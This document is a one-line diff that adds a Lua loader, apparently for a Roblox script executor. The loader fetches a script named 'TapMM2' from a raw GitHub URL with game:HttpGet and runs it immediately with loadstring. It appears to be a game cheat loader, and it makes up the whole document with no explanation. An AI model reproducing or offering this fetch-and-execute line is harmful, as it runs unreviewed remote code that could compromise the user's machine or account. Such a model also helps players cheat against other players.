@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SergiuPro1222/TapperX/main/TapMM2", true))()
